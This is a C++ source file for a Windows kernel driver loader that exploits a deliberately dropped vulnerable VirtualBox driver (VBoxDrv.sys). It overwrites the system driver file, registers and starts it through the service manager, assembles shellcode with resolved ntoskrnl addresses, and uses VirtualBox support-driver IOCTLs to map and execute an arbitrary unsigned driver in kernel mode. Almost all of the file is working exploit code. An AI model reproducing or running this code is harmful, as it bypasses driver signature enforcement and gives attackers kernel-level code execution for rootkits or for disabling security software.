#include "DriverLoader.h"

bool SCMDriverHelper::scmInstallDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName, _Inout_opt_ LPCTSTR ServiceExe) {
	SC_HANDLE  schService;
	schService = CreateService(SchSCManager, // SCManager database
		DriverName,           // name of service
		DriverName,           // name to display
		SERVICE_ALL_ACCESS,    // desired access
		SERVICE_KERNEL_DRIVER, // service type
		SERVICE_DEMAND_START,  // start type
		SERVICE_ERROR_NORMAL,  // error control type
		ServiceExe,            // service's binary
		NULL,                  // no load ordering group
		NULL,                  // no tag identifier
		NULL,                  // no dependencies
		NULL,                  // LocalSystem account
		NULL                   // no password
	);
	if (schService == NULL) {
		return false;
	}
	CloseServiceHandle(schService);
	return true;
}

bool SCMDriverHelper::scmStartDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName) {
	SC_HANDLE  schService;
	bool       ret;
	schService = OpenService(SchSCManager, DriverName, SERVICE_ALL_ACCESS);
	if (schService == NULL)
		return false;
	ret = StartService(schService, 0, NULL) || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING;
	CloseServiceHandle(schService);
	return ret;
}

bool SCMDriverHelper::scmOpenDevice(IN LPCTSTR DriverName, _Inout_opt_ PHANDLE lphDevice) {
	TCHAR    completeDeviceName[64];
	HANDLE   hDevice;

	RtlSecureZeroMemory(completeDeviceName, sizeof(completeDeviceName));
	wsprintf(completeDeviceName, TEXT("\\\\.\\%s"), DriverName);

	hDevice = CreateFile(completeDeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
		return false;
	if (lphDevice) {
		*lphDevice = hDevice;
	}
	else {
		CloseHandle(hDevice);
	}
	return true;
}

bool SCMDriverHelper::scmStopDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName) {
	INT             iRetryCount;
	SC_HANDLE       schService;
	BOOL            ret;
	SERVICE_STATUS  serviceStatus;

	ret = false;
	schService = OpenService(SchSCManager, DriverName, SERVICE_ALL_ACCESS);
	if (schService == NULL) {
		return ret;
	}

	iRetryCount = 5;
	do {
		SetLastError(0);

		ret = ControlService(schService, SERVICE_CONTROL_STOP, &serviceStatus);
		if (ret == true)
			break;

		if (GetLastError() != ERROR_DEPENDENT_SERVICES_RUNNING)
			break;

		Sleep(1000);
		iRetryCount--;
	} while (iRetryCount);
	CloseServiceHandle(schService);
	return ret;
}

bool SCMDriverHelper::scmRemoveDriver(IN SC_HANDLE SchSCManager, IN LPCTSTR DriverName) {
	SC_HANDLE  schService;
	BOOL       bResult = false;

	schService = OpenService(SchSCManager, DriverName, DELETE);

	if (schService == NULL) {
		return bResult;
	}

	bResult = DeleteService(schService);
	CloseServiceHandle(schService);
	return bResult;
}

//Combines scmStopDriver and scmRemoveDriver.
bool SCMDriverHelper::scmUnloadDeviceDriver(IN LPCTSTR Name) {
	SC_HANDLE	schSCManager;
	BOOL		bResult = FALSE;

	if (Name == NULL) {
		return bResult;
	}

	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager) {
		scmStopDriver(schSCManager, Name);
		bResult = scmRemoveDriver(schSCManager, Name);
		CloseServiceHandle(schSCManager);
	}
	return bResult;
}
//Unload if already exists, Create, Load and Open driver instance.
bool SCMDriverHelper::scmLoadDeviceDriver(IN LPCTSTR Name, _Inout_opt_ LPCTSTR Path, _Inout_ PHANDLE lphDevice) {
	SC_HANDLE	schSCManager;
	bool		bResult = false;

	if (Name == NULL) {
		return bResult;
	}

	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager) {
		scmRemoveDriver(schSCManager, Name);
		scmInstallDriver(schSCManager, Name, Path);
		scmStartDriver(schSCManager, Name);
		bResult = scmOpenDevice(Name, lphDevice);
		CloseServiceHandle(schSCManager);
	}
	return bResult;
}

void DriverLoader::StopVBoxDriver(HANDLE hVBox) {
	SC_HANDLE	       schSCManager;
	LPWSTR             msg;
	UNICODE_STRING     uStr;
	OBJECT_ATTRIBUTES  ObjectAttributes;
	SCMDriverHelper	scmDriverHelper;

	printf("SCM: Unloading vulnerable driver\n");

	if (hVBox != INVALID_HANDLE_VALUE)
		CloseHandle(hVBox);
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager == NULL) {
		printf("SCM: Cannot open database, unable unload driver");
		currentState = SCMDatabaseOpenFail;
		return;
	}


	//stop driver in any case
	if (scmDriverHelper.scmStopDriver(schSCManager, VBoxDrvSvc))
		msg = TEXT("SCM: Vulnerable driver successfully unloaded");
	else {
		msg = TEXT("SCM: Unexpected error while unloading driver");
		currentState = VBoxUnloadFail;
	}

	wprintf(L"%ls\n", msg);

	//if VBox not installed - remove from scm database and delete file
	if (fVBoxInstalled == FALSE) {

		if (scmDriverHelper.scmRemoveDriver(schSCManager, VBoxDrvSvc))
			msg = TEXT("SCM: Driver entry removed from registry");
		else {
			msg = TEXT("SCM: Error removing driver entry from registry");
			currentState = VBoxRemoveError;
		}

		wprintf(L"%ls\n", msg);

		RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
		InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
		if (NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
			msg = TEXT("Ldr: Driver file removed");
		else {
			msg = TEXT("Ldr: Error removing driver file");
			currentState = VBoxDriverRemoveFail;
		}

		wprintf(L"%ls\n", msg);

	}
	else {
		//VBox software present, restore original driver and exit
		if (BackupVBoxDrv(true))
			msg = TEXT("Ldr: Original driver restored");
		else {
			msg = TEXT("Ldr: Unexpected error while restoring original driver");
			currentState = VBoxDriverRestoreFail;
		}

		wprintf(L"%ls\n", msg);
	}
	CloseServiceHandle(schSCManager);
}

HANDLE DriverLoader::LoadVBoxDriver(PBYTE VBoxDriverBuffer, ULONG BufferSize) {
	PBYTE       DrvBuffer;
	ULONG       DataSize = 0, bytesIO;
	HANDLE      hDevice = INVALID_HANDLE_VALUE;
	WCHAR       szDriverFileName[MAX_PATH * 2];
	SC_HANDLE   schSCManager = NULL;
	LPWSTR      msg;
	HINSTANCE	hInstance;

	hInstance = GetModuleHandle(nullptr);
	DrvBuffer = VBoxDriverBuffer;
	DataSize = BufferSize;
	SCMDriverHelper scmDriverHelper;
	while (DrvBuffer) {
		RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
		if (!GetSystemDirectory(szDriverFileName, MAX_PATH)) {
			printf("Ldr: Error loading VirtualBox driver, GetSystemDirectory failed\n");
			currentState = GetSystemDirectoryFail;
			break;
		}

		schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (schSCManager == NULL) {
			printf("Ldr: Error opening SCM database. \n");
			currentState = SCMDatabaseOpenFail;
			break;
		}

		//lookup main vbox driver device, if found, try to unload all possible, unload order is sensitive
		if (ObjectExists(L"\\Device", L"VBoxDrv")) {
			printf("Ldr: Active VirtualBox found in system, attempt unload it\n");

			if (scmDriverHelper.scmStopDriver(schSCManager, TEXT("VBoxNetAdp"))) {
				printf("SCM: VBoxNetAdp driver unloaded\n");
			}
			if (scmDriverHelper.scmStopDriver(schSCManager, TEXT("VBoxNetLwf"))) {
				printf("SCM: VBoxNetLwf driver unloaded\n");
			}
			if (scmDriverHelper.scmStopDriver(schSCManager, TEXT("VBoxUSBMon"))) {
				printf("SCM: VBoxUSBMon driver unloaded\n");
			}
			Sleep(1000);
			if (scmDriverHelper.scmStopDriver(schSCManager, TEXT("VBoxDrv"))) {
				printf("SCM: VBoxDrv driver unloaded\n");
			}
		}

		//if vbox installed backup it driver, do it before dropping our
		if (fVBoxInstalled) {
			if (BackupVBoxDrv(FALSE) == FALSE) {
				printf("Ldr: Error while doing VirtualBox driver backup\n");
				currentState = VBoxBackupError;
				break;
			}
		}

		//drop our vboxdrv version
		lstrcat(szDriverFileName, TEXT("\\drivers\\VBoxDrv.sys"));
		bytesIO = (ULONG)WriteBufferToFile(szDriverFileName, DrvBuffer, (SIZE_T)DataSize, FALSE, FALSE);

		if (bytesIO != DataSize) {
			printf("Ldr: Error writing VirtualBox on disk\n");
			currentState = VBoxWritingError;
			break;
		}

		//if vbox not found in system install driver in scm
		if (fVBoxInstalled == FALSE) {
			scmDriverHelper.scmInstallDriver(schSCManager, VBoxDrvSvc, szDriverFileName);
		}

		//run driver
		if (scmDriverHelper.scmStartDriver(schSCManager, VBoxDrvSvc) == TRUE) {

			if (scmDriverHelper.scmOpenDevice(VBoxDrvSvc, &hDevice))
				msg = (LPWSTR)TEXT("SCM: Vulnerable driver loaded and opened\n");
			else {
				msg = (LPWSTR)TEXT("SCM: Driver device open failure\n");
				currentState = VBoxDriverOpenFail;
			}

		}
		else {
			msg = (LPWSTR)TEXT("SCM: Vulnerable driver load failure\n");
			currentState = VBoxDriverLoadFail;
		}

		wprintf(L"%ls", msg);
		break;
	}

	//post cleanup
	if (schSCManager != NULL) {
		CloseServiceHandle(schSCManager);
	}
	return hDevice;
}
//Create new file (or open existing) and write (append) buffer to it.
SIZE_T DriverLoader::WriteBufferToFile(IN PWSTR lpFileName, IN PVOID Buffer, IN SIZE_T Size, IN BOOL Flush, IN BOOL Append) {
	NTSTATUS           Status;
	DWORD              dwFlag;
	HANDLE             hFile = NULL;
	OBJECT_ATTRIBUTES  attr;
	UNICODE_STRING     NtFileName;
	IO_STATUS_BLOCK    IoStatus;
	LARGE_INTEGER      Position;
	ACCESS_MASK        DesiredAccess;
	PLARGE_INTEGER     pPosition = NULL;
	ULONG_PTR          nBlocks, BlockIndex;
	ULONG              BlockSize, RemainingSize;
	PBYTE              ptr = (PBYTE)Buffer;
	SIZE_T             BytesWritten = 0;

	if (RtlDosPathNameToNtPathName_U(lpFileName, &NtFileName, NULL, NULL) == FALSE)
		return 0;

	DesiredAccess = FILE_WRITE_ACCESS | SYNCHRONIZE;
	dwFlag = FILE_OVERWRITE_IF;

	if (Append == TRUE) {
		DesiredAccess |= FILE_READ_ACCESS;
		dwFlag = FILE_OPEN_IF;
	}

	InitializeObjectAttributes(&attr, &NtFileName, OBJ_CASE_INSENSITIVE, 0, NULL);

	__try {
		Status = NtCreateFile(&hFile, DesiredAccess, &attr, &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, dwFlag,
			FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);

		if (!NT_SUCCESS(Status))
			__leave;

		pPosition = NULL;

		if (Append == TRUE) {
			Position.LowPart = FILE_WRITE_TO_END_OF_FILE;
			Position.HighPart = -1;
			pPosition = &Position;
		}

		if (Size < 0x80000000) {
			BlockSize = (ULONG)Size;
			Status = NtWriteFile(hFile, 0, NULL, NULL, &IoStatus, ptr, BlockSize, pPosition, NULL);
			if (!NT_SUCCESS(Status))
				__leave;

			BytesWritten += IoStatus.Information;
		}
		else {
			BlockSize = 0x7FFFFFFF;
			nBlocks = (Size / BlockSize);
			for (BlockIndex = 0; BlockIndex < nBlocks; BlockIndex++) {

				Status = NtWriteFile(hFile, 0, NULL, NULL, &IoStatus, ptr, BlockSize, pPosition, NULL);
				if (!NT_SUCCESS(Status))
					__leave;

				ptr += BlockSize;
				BytesWritten += IoStatus.Information;
			}
			RemainingSize = Size % BlockSize;
			if (RemainingSize != 0) {
				Status = NtWriteFile(hFile, 0, NULL, NULL, &IoStatus, ptr, RemainingSize, pPosition, NULL);
				if (!NT_SUCCESS(Status))
					__leave;
				BytesWritten += IoStatus.Information;
			}
		}
	}
	__finally {
		if (hFile != NULL) {
			if (Flush == TRUE) NtFlushBuffersFile(hFile, &IoStatus);
			NtClose(hFile);
		}
		RtlFreeUnicodeString(&NtFileName);
	}
	return BytesWritten;
}

bool DriverLoader::BackupVBoxDrv(IN bool bRestore) {
	BOOL  bResult = FALSE;
	WCHAR szOldDriverName[MAX_PATH * 2];
	WCHAR szNewDriverName[MAX_PATH * 2];
	WCHAR szDriverDirName[MAX_PATH * 2];

	if (!GetSystemDirectory(szDriverDirName, MAX_PATH)) {
		return FALSE;
	}

	lstrcat(szDriverDirName, TEXT("\\drivers\\"));

	if (bRestore) {
		lstrcpy(szOldDriverName, szDriverDirName);
		lstrcat(szOldDriverName, TEXT("VBoxDrv.backup"));
		if (PathFileExists(szOldDriverName)) {
			lstrcpy(szNewDriverName, szDriverDirName);
			lstrcat(szNewDriverName, TEXT("VBoxDrv.sys"));
			bResult = MoveFileEx(szOldDriverName, szNewDriverName,
				MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
		}
	}
	else {
		lstrcpy(szOldDriverName, szDriverDirName);
		lstrcat(szOldDriverName, TEXT("VBoxDrv.sys"));
		lstrcpy(szNewDriverName, szDriverDirName);
		lstrcat(szNewDriverName, TEXT("VBoxDrv.backup"));
		bResult = MoveFileEx(szOldDriverName, szNewDriverName,
			MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH);
	}
	return bResult;
}

bool DriverLoader::VBoxInstalled() {
	bool     bPresent = FALSE;
	LRESULT  lRet;
	HKEY     hKey = NULL;
	lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Oracle\\VirtualBox"),
		0, KEY_READ, &hKey);
	bPresent = (hKey != NULL);
	if (hKey) {
		RegCloseKey(hKey);
	}
	return bPresent;
}

bool DriverLoader::ObjectExists(IN LPWSTR RootDirectory, IN LPWSTR ObjectName) {
	OBJSCANPARAM Param;

	if (ObjectName == NULL) {
		return FALSE;
	}

	Param.Buffer = ObjectName;
	Param.BufferSize = (ULONG)lstrlen(ObjectName);

	return NT_SUCCESS(DrvLdrEnumSystemObjects(RootDirectory, NULL, DetectObjectCallback, &Param));
}

PVOID DriverLoader::GetSystemInfo(IN SYSTEM_INFORMATION_CLASS InfoClass) {
	INT         c = 0;
	PVOID       Buffer = NULL;
	ULONG		Size = 0x1000;
	NTSTATUS    status;
	ULONG       memIO;
	PVOID       hHeap = NtCurrentPeb()->ProcessHeap;

	do {
		Buffer = RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, (SIZE_T)Size);
		if (Buffer != NULL) {
			status = NtQuerySystemInformation(InfoClass, Buffer, Size, &memIO);
		}
		else {
			return NULL;
		}
		if (status == STATUS_INFO_LENGTH_MISMATCH) {
			RtlFreeHeap(hHeap, 0, Buffer);
			Size *= 2;
			c++;
			if (c > 100) {
				status = STATUS_SECRET_TOO_LONG;
				break;
			}
		}
	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	if (NT_SUCCESS(status)) {
		return Buffer;
	}

	if (Buffer) {
		RtlFreeHeap(hHeap, 0, Buffer);
	}
	return NULL;
}

ULONG_PTR DriverLoader::GetNtOsBase() {
	PRTL_PROCESS_MODULES   miSpace;
	ULONG_PTR              NtOsBase = 0;

	miSpace = (PRTL_PROCESS_MODULES)GetSystemInfo(SystemModuleInformation);
	while (miSpace != NULL) {
		NtOsBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
		RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, miSpace);
		break;
	}
	return NtOsBase;
}

UINT DriverLoader::MapDriver(LPWSTR lpDriverFullName, PBYTE DriverBuffer)
{
	UINT               result = (UINT)-1;
	ULONG              isz;
	SIZE_T             memIO;
	ULONG_PTR          KernelBase, KernelImage = 0, xExAllocatePoolWithTag = 0, xPsCreateSystemThread = 0;
	HMODULE            Image = NULL;
	PIMAGE_NT_HEADERS  FileHeader;
	PBYTE              Buffer = NULL;
	UNICODE_STRING     uStr;
	ANSI_STRING        routineName;
	NTSTATUS           status;
	WCHAR              text[256];

	KernelBase = GetNtOsBase();
	while (KernelBase != 0) {

		lstrcpy(text, TEXT("Ldr: Kernel base = 0x"));
		wprintf(L"%ls%llx\n", text, KernelBase);

		RtlSecureZeroMemory(&uStr, sizeof(uStr));
		RtlInitUnicodeString(&uStr, lpDriverFullName);
		if (DriverBuffer == NULL)
			status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&Image);
		else {	//warning: untested function
			Image = (HMODULE)DriverBuffer;
		}
		if ((!NT_SUCCESS(status)) || (Image == NULL)) {
			printf("Ldr: Error while loading input driver file\n");
			break;
		}
		else {
			wprintf(L"Ldr: Input driver file loaded at 0x%llx\n", Image);
		}

		FileHeader = RtlImageNtHeader(Image);
		if (FileHeader == NULL)
			break;

		isz = FileHeader->OptionalHeader.SizeOfImage;
		//resolve ntoskrnl
		printf("Ldr: Loading ntoskrnl.exe\n");

		RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
		status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&KernelImage);
		if ((!NT_SUCCESS(status)) || (KernelImage == 0)) {
			printf("Ldr: Error while loading ntoskrnl.exe\n");
			currentState = ntoskrnlLoadFail;
			break;
		}
		else {
			lstrcpy(text, TEXT("Ldr: ntoskrnl.exe loaded at 0x"));
			wprintf(L"%ls%llx\n", text, KernelImage);
		}

		RtlInitString(&routineName, "ExAllocatePoolWithTag");
		status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xExAllocatePoolWithTag);	//one more *
		if ((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
			printf("Ldr: Error, ExAllocatePoolWithTag address not found\n");
			break;
		}
		else {
			lstrcpy(text, TEXT("Ldr: ExAllocatePoolWithTag 0x"));
			ULONG_PTR addrExAllocatePoolWithTag = KernelBase + (xExAllocatePoolWithTag - KernelImage);
			wprintf(L"%ls%llx\n", text, addrExAllocatePoolWithTag);
		}

		RtlInitString(&routineName, "PsCreateSystemThread");
		status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xPsCreateSystemThread);//one more *
		if ((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
			printf("Ldr: Error, PsCreateSystemThread address not found\n");
			currentState = PsCreateSystemThreadNotFound;
			break;
		}
		else {
			lstrcpy(text, TEXT("Ldr: PsCreateSystemThread 0x"));
			ULONG_PTR addrPsCreateSystemThread = KernelBase + (xPsCreateSystemThread - KernelImage);
			wprintf(L"%ls%llx\n", text, addrPsCreateSystemThread);
		}

		memIO = isz + PAGE_SIZE;
		NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, 0, &memIO,	//one more *
			MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (Buffer == NULL) {
			printf("Ldr: Error, unable to allocate shellcode\n");
			currentState = ShellCodeAllocError;
			break;
		}
		else {
			lstrcpy(text, TEXT("Ldr: Shellcode allocated at 0x"));
			wprintf(L"%ls%llx\n", text, Buffer);
		}

		// mov rcx, ExAllocatePoolWithTag
		// mov rdx, PsCreateSystemThread

		Buffer[0x00] = 0x48; // mov rcx, xxxxx
		Buffer[0x01] = 0xb9;
		*((PULONG_PTR)&Buffer[2]) = KernelBase + (xExAllocatePoolWithTag - KernelImage);
		Buffer[0x0a] = 0x48; // mov rdx, xxxxx
		Buffer[0x0b] = 0xba;
		*((PULONG_PTR)&Buffer[0x0c]) = KernelBase + (xPsCreateSystemThread - KernelImage);

		RtlCopyMemory(Buffer + 0x14, BootstrapLoader_code, sizeof(BootstrapLoader_code));
		RtlCopyMemory(Buffer + scDataOffset, Image, isz);

		printf("Ldr: Resolving kernel import\n");
		ResolveKernelImport((ULONG_PTR)Buffer + scDataOffset, KernelImage, KernelBase);

		printf("Ldr: Executing exploit\n");
		Exploit(Buffer, isz + PAGE_SIZE);
		result = 0;
		break;
	}
	if (Buffer != NULL) {
		memIO = 0;
		NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, &memIO, MEM_RELEASE);
	}
	return result;
}

void DriverLoader::Exploit(LPVOID Shellcode, ULONG CodeSize)
{
	SUPCOOKIE       Cookie;
	SUPLDROPEN      OpenLdr;
	DWORD           bytesIO = 0;
	RTR0PTR         ImageBase = NULL;
	ULONG_PTR       paramOut;
	PSUPLDRLOAD     pLoadTask = NULL;
	SUPSETVMFORFAST vmFast;
	SUPLDRFREE      ldrFree;
	SIZE_T          memIO;
	WCHAR           text[256];

	while (g_hVBox != INVALID_HANDLE_VALUE) {
		RtlSecureZeroMemory(&Cookie, sizeof(SUPCOOKIE));
		Cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
		Cookie.Hdr.cbIn = SUP_IOCTL_COOKIE_SIZE_IN;
		Cookie.Hdr.cbOut = SUP_IOCTL_COOKIE_SIZE_OUT;
		Cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		Cookie.Hdr.rc = 0;
		Cookie.u.In.u32ReqVersion = 0;
		Cookie.u.In.u32MinVersion = 0x00070002;
		RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

		if (!DeviceIoControl(g_hVBox, SUP_IOCTL_COOKIE, &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
			SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
		{
			printf("Ldr: SUP_IOCTL_COOKIE call failed\n");
			currentState = IoCtlCookieFail;
			break;
		}

		RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
		OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		OpenLdr.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		OpenLdr.Hdr.cbIn = SUP_IOCTL_LDR_OPEN_SIZE_IN;
		OpenLdr.Hdr.cbOut = SUP_IOCTL_LDR_OPEN_SIZE_OUT;
		OpenLdr.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		OpenLdr.Hdr.rc = 0;
		OpenLdr.u.In.cbImage = CodeSize;
		RtlCopyMemory(OpenLdr.u.In.szName, ImageName, sizeof(ImageName));

		if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_OPEN, &OpenLdr,
			SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
			SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
		{
			printf("Ldr: SUP_IOCTL_LDR_OPEN call failed\n");
			currentState = IoCtlLdrOpenFail;
			break;
		}
		else {
			lstrcpy(text, TEXT("Ldr: OpenLdr.u.Out.pvImageBase = 0x"));
			ULONG_PTR pvImgBase = (ULONG_PTR)OpenLdr.u.Out.pvImageBase;
			wprintf(L"%ls%llx\n", text, pvImgBase);
		}

		ImageBase = OpenLdr.u.Out.pvImageBase;

		memIO = PAGE_SIZE + CodeSize;
		NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, 0, &memIO,
			MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (pLoadTask == NULL)
			break;

		pLoadTask->Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		pLoadTask->Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		pLoadTask->Hdr.cbIn =
			(ULONG_PTR)(&((PSUPLDRLOAD)0)->u.In.achImage) + CodeSize;
		pLoadTask->Hdr.cbOut = SUP_IOCTL_LDR_LOAD_SIZE_OUT;
		pLoadTask->Hdr.fFlags = SUPREQHDR_FLAGS_MAGIC;
		pLoadTask->Hdr.rc = 0;
		pLoadTask->u.In.eEPType = SUPLDRLOADEP_VMMR0;
		pLoadTask->u.In.pvImageBase = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0 = (RTR0PTR)ImageHandle;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryEx = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryFast = ImageBase;
		pLoadTask->u.In.EP.VMMR0.pvVMMR0EntryInt = ImageBase;
		RtlCopyMemory(pLoadTask->u.In.achImage, Shellcode, CodeSize);
		pLoadTask->u.In.cbImage = CodeSize;

		if (!DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_LOAD,
			pLoadTask, pLoadTask->Hdr.cbIn,
			pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
		{
			printf("Ldr: SUP_IOCTL_LDR_LOAD call failed\n");
			currentState = IoCtlLoadFail;
			break;
		}
		else {
			printf("Ldr: SUP_IOCTL_LDR_LOAD, success\r\n\tShellcode mapped at 0x%llx", ImageBase);
			printf(", size = 0x%llx \n", CodeSize);
			printf("Driver image mapped at 0x%llx\n", (ULONG_PTR)ImageBase + scDataOffset);
		}

		RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
		vmFast.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		vmFast.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		vmFast.Hdr.rc = 0;
		vmFast.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		vmFast.Hdr.cbIn = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN;
		vmFast.Hdr.cbOut = SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT;
		vmFast.u.In.pVMR0 = (LPVOID)ImageHandle;

		if (!DeviceIoControl(g_hVBox, SUP_IOCTL_SET_VM_FOR_FAST,
			&vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
			&vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
		{
			printf("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call failed\n");
			currentState = IoCtlSetVMFastCallFail;
			break;
		}
		else {
			printf("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call complete\n");
		}

		printf("Ldr: SUP_IOCTL_FAST_DO_NOP\n");

		paramOut = 0;
		DeviceIoControl(g_hVBox, SUP_IOCTL_FAST_DO_NOP,
			NULL, 0,
			&paramOut, sizeof(paramOut), &bytesIO, NULL);

		printf("Ldr: SUP_IOCTL_LDR_FREE\n");

		RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
		ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
		ldrFree.Hdr.u32SessionCookie = Cookie.u.Out.u32SessionCookie;
		ldrFree.Hdr.cbIn = SUP_IOCTL_LDR_FREE_SIZE_IN;
		ldrFree.Hdr.cbOut = SUP_IOCTL_LDR_FREE_SIZE_OUT;
		ldrFree.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
		ldrFree.Hdr.rc = 0;
		ldrFree.u.In.pvImageBase = ImageBase;

		DeviceIoControl(g_hVBox, SUP_IOCTL_LDR_FREE,
			&ldrFree, SUP_IOCTL_LDR_FREE_SIZE_IN,
			&ldrFree, SUP_IOCTL_LDR_FREE_SIZE_OUT, &bytesIO, NULL);

		break;
	}

	if (pLoadTask != NULL) {
		memIO = 0;
		NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, &memIO, MEM_RELEASE);	//one more *
	}

	if (g_hVBox != INVALID_HANDLE_VALUE) {
		CloseHandle(g_hVBox);
		g_hVBox = INVALID_HANDLE_VALUE;
	}
}
//Resolve import (ntoskrnl only).
void DriverLoader::ResolveKernelImport(ULONG_PTR Image, ULONG_PTR KernelImage, ULONG_PTR KernelBase) {
	PIMAGE_OPTIONAL_HEADER      popth;
	ULONG_PTR                   ITableVA, *nextthunk;
	PIMAGE_IMPORT_DESCRIPTOR    ITable;
	PIMAGE_THUNK_DATA           pthunk;
	PIMAGE_IMPORT_BY_NAME       pname;
	ULONG                       i;

	popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

	if (popth->NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT)
		return;

	ITableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
	if (ITableVA == 0)
		return;

	ITable = (PIMAGE_IMPORT_DESCRIPTOR)(Image + ITableVA);

	if (ITable->OriginalFirstThunk == 0)
		pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->FirstThunk);
	else
		pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->OriginalFirstThunk);

	for (i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
		nextthunk = (PULONG_PTR)(Image + ITable->FirstThunk);
		if ((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
			pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image + pthunk->u1.AddressOfData);
			nextthunk[i] = GetProcAddress(KernelBase, KernelImage, pname->Name);
		}
		else
			nextthunk[i] = GetProcAddress(KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
	}
}

ULONG_PTR DriverLoader::GetProcAddress(ULONG_PTR KernelBase, ULONG_PTR KernelImage, LPCSTR FunctionName) {
	ANSI_STRING    cStr;
	ULONG_PTR      pfn = 0;
	RtlInitString(&cStr, FunctionName);
	if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))	//one more *
		return 0;

	return KernelBase + (pfn - KernelImage);
}
//Load specially designed driver
UINT DriverLoader::LoadDriverFromFile(WCHAR *szInputFile) {
	UINT ret = (UINT)-1;
	if (PathFileExists(szInputFile)) {
		g_hVBox = LoadVBoxDriver((PBYTE)VBoxBinary::VBoxDriverData, VBoxBinary::VBoxBinarySize);
		if (g_hVBox != INVALID_HANDLE_VALUE) {
			ret = MapDriver(szInputFile);
			StopVBoxDriver(g_hVBox);
		}
		else {
			printf("Invalid VBox driver handle\n");
			currentState = VBoxHandleInvalid;
		}
	}
	else {
		printf("Driver file does not exist\n");
		currentState = DriverPathError;
		ret = (UINT)-1;
	}
	return ret;
}
//"DATA" resource
